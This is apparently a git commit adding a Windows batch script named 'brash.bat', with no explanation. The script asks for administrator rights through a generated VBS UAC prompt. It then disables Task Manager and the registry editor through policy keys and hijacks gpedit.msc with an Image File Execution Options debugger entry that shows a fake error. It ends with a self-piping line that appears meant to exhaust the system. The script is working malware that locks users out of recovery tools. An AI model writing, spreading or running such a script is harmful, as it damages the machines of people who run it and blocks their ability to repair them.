6a2ea6ae33d513b43296679dd59c6c2394fd0bb2
michelle1574 <70703680+michelle1574@users.noreply.github.com>
2021-08-22 21:14:39 +0100

    Trash 1

---
+++ trash-1/brash.bat
@@ -0,0 +1,28 @@
+@echo off
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" /v DisableTaskMgr /d 1 /t REG_DWORD /f > nul
+echo x=msgbox("The gpedit.msc has been disabled by administrator.", VBOkOnly+VbCritical, "Error") > C:\Windows\error_gpedit.msc.vbs
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc" /v Debugger /d C:\Windows\error_gpedit.msc.vbs /t REG_SZ /f > nul
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /d 1 /t REG_DWORD /f > nul
+start explorer.exe
+start notepad.exe
+%1 | %1
